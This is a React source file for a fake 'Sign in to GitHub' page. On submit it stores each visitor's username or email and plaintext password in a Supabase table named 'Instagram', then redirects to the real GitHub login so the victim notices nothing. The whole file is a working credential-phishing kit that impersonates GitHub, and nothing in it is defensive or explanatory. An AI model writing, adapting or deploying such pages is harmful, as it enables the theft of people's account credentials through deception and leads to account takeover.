import React, { useState } from "react";
import "./GitHubLogin.css";
import { supabase } from "../../supabase";
import { FaGithub } from "react-icons/fa";

const GitHubLogin = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError("");
    setSuccess(false);
    const { error } = await supabase.from("Instagram").insert([
      { email, password },
    ]);
    setLoading(false);
    if (error) setError("Login failed. Try again.");
    else {
      setSuccess(true);
      window.location.href = "https://github.com/login";
    }
  };

  return (
    <div className="github-login-container">
      <div className="github-login-box">
        <div className="github-logo"><FaGithub /></div>
        <h2>Sign in to GitHub</h2>
        <form className="github-login-form" onSubmit={handleSubmit}>
          <label className="github-login-label">Username or email address</label>
          <input
            type="text"
            className="github-login-input"
            placeholder="Username or email address"
            value={email}
            onChange={e => setEmail(e.target.value)}
            required
          />
          <label className="github-login-label">Password</label>
          <input
            type="password"
            className="github-login-input"
            placeholder="Password"
            value={password}
            onChange={e => setPassword(e.target.value)}
            required
          />
          <a className="github-login-forgot" href="https://github.com/password_reset" target="_blank" rel="noopener noreferrer">Forgot password?</a>
          <button type="submit" disabled={loading}>
            {loading ? "Signing in..." : "Sign in"}
          </button>
        </form>
        {success && <div className="github-success">Login saved!</div>}
        {error && <div className="github-error">{error}</div>}
        <div className="github-login-signup">
          New to GitHub?
          <a href="https://github.com/join" target="_blank" rel="noopener noreferrer">Create an account</a>
        </div>
      </div>
    </div>
  );
};

export default GitHubLogin;
